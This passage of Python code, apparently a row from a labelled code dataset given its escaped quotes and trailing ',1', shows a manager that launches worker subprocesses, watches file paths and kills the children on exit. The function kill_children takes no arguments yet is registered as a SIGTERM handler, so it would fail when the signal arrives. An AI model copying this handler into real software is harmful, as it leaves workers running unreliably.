                                    stderr=subprocess.PIPE)
            child_pids.append(proc.pid)
            log.info(""Started worker with pid %s"" % proc.pid)

    def kill_children():
        """"""
        kill subprocess on exit of manager (this) process
        """"""
        log.info(""Stopping worker(s)"")
        for pid in child_pids:
            if pid is not None:
                os.kill(pid, signal.SIGTERM)

    run_children()
    atexit.register(kill_children)
    signal.signal(signal.SIGTERM, kill_children)
    if watch_paths:
        observer = Observer()
        for path in watch_paths:
            if not is_background:
                print(""Watching for changes under %s"" % path)
            observer.schedule(handler, path=path, recursive=True)
        observer.start()
    while 1:
        try:
            sleep(1)
        except KeyboardInterrupt:
            log.info(""Keyboard interrupt, exiting"")
            if watch_paths:
                observer.stop()
                observer.join()
            sys.exit(0)


if __name__ == '__main__':
    if 'manage' in str(sys.argv):
        no_subprocess = [arg.split('manage=')[-1] for arg in sys.argv if 'manage' in arg][0]
        run_workers(no_subprocess)
    else:
        worker = Worker()
        worker.run()
/n/n/n",1
